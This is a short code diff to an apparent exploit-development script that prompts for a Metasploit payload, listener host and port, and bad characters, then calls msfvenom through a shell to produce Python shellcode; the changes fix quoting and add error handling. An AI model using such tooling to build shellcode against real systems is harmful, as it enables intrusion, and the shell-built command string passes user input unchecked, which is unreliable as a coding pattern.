@@ -334,7 +334,7 @@ class exploit:
                     args = input(
                         "\nEnter any payload arguments: (e.g. LHOST=8.8.8.8 LPORT=4444)\n").strip()
                     bad_chars = input(
-                        "\nEnter any bad characters: (e.g. \"\x00\x0a\x0d\")\n").strip()
+                        "\nEnter any bad characters: (e.g. " + r"\x00\x0a\x0d" + ")\n").strip()
                     if check_input():
                         break
                 self.shellcode = get_venom(payload, args, bad_chars)
@@ -660,11 +660,17 @@ def get_venom(payload, args, bad_chars):
     if len(args) > 1:
         cmd_string += " " + args
     if len(bad_chars) > 1:
+        if not re.search(r"^[\"|\'].+[\"|\']$", bad_chars):
+            bad_chars = "\"" + bad_chars + "\""
         cmd_string += " -b " + bad_chars
     cmd_string += " -f python"
 
-    output = subprocess.check_output(
-        cmd_string, shell=True, universal_newlines=True)
+    try:
+        output = subprocess.check_output(
+            cmd_string, shell=True, universal_newlines=True)
+    except:
+        print("\n#|| Error calling msfvenom. You'll need to get shellcode elsewhere.\n")
+        return None
     lines = [line for line in output.split("\n") if "buf +=" in line]
     out = []
     for line in lines:
